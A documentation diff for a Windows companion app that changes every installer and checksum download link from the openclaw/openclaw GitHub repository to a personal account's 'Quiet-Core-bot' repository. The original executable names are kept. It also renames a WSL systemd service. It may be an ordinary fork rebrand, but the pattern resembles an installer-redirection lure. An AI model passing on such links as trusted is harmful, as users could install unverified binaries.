@@ -18,13 +18,13 @@ most Linux-compatible Gateway runtime.
 Windows Hub is the native WinUI companion app for Windows 10 20H2+ and Windows 11. It installs without administrator privileges and is published with signed
 x64 and ARM64 installers on Quiet Core bot releases.
 
-Download the latest stable installer from the [Quiet Core bot releases page](https://github.com/openclaw/openclaw/releases):
+Download the latest stable installer from the [Quiet Core bot releases page](https://github.com/liuda1999/Quiet-Core-bot/releases):
 
-- [OpenClawCompanion-Setup-x64.exe](https://github.com/openclaw/openclaw/releases/download/v2026.6.5/OpenClawCompanion-Setup-x64.exe)
-- [OpenClawCompanion-Setup-arm64.exe](https://github.com/openclaw/openclaw/releases/download/v2026.6.5/OpenClawCompanion-Setup-arm64.exe)
-- [Checksums](https://github.com/openclaw/openclaw/releases/download/v2026.6.5/OpenClawCompanion-SHA256SUMS.txt)
+- [OpenClawCompanion-Setup-x64.exe](https://github.com/liuda1999/Quiet-Core-bot/releases/download/v2026.6.5/OpenClawCompanion-Setup-x64.exe)
+- [OpenClawCompanion-Setup-arm64.exe](https://github.com/liuda1999/Quiet-Core-bot/releases/download/v2026.6.5/OpenClawCompanion-Setup-arm64.exe)
+- [Checksums](https://github.com/liuda1999/Quiet-Core-bot/releases/download/v2026.6.5/OpenClawCompanion-SHA256SUMS.txt)
 
-If a download link above returns a 404, visit the [releases page](https://github.com/openclaw/openclaw/releases) and look for the `OpenClawCompanion-Setup-*` assets on the latest release.
+If a download link above returns a 404, visit the [releases page](https://github.com/liuda1999/Quiet-Core-bot/releases) and look for the `OpenClawCompanion-Setup-*` assets on the latest release.
 
 After install, launch **Quiet Core bot Companion** from the Start menu or the system
 tray. The installer also adds shortcuts for Gateway Setup, Chat, Settings,
@@ -214,8 +214,8 @@ wsl --list --verbose
 After reboot, verify from WSL:
 
 ```bash
-systemctl --user is-enabled openclaw-gateway.service
-systemctl --user status openclaw-gateway.service --no-pager
+systemctl --user is-enabled quiet-core-bot-gateway.service
+systemctl --user status quiet-core-bot-gateway.service --no-pager
 ```
 
 ## Expose WSL services over LAN
